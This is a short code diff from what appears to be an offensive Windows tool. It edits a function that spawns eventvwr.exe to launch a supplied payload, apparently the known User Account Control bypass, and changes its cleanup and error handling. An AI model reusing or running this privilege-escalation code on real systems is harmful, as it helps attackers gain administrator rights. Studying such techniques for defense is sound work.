@@ -40,15 +40,14 @@ def eventvwr(payload):
 			print_success("Successfully disabled file system redirection")
 			if process().create("eventvwr.exe"):
 				print_success("Successfully spawned process ({})".format(os.path.join(payload)))
+				time.sleep(5)
+				eventvwr_cleanup(path)
 			else:
 				print_error("Unable to spawn process ({})".format(os.path.join(payload)))
-				if "error" in Constant.output:
-					eventvwr_cleanup(path)
-
-		time.sleep(5)
-
-		if not eventvwr_cleanup(path):
-			print_success("All done!")
+				for x in Constant.output:
+					if "error" in x:
+						eventvwr_cleanup(path)
+						return False
 	else:
 		print_error("Cannot proceed, invalid payload")
 		return False
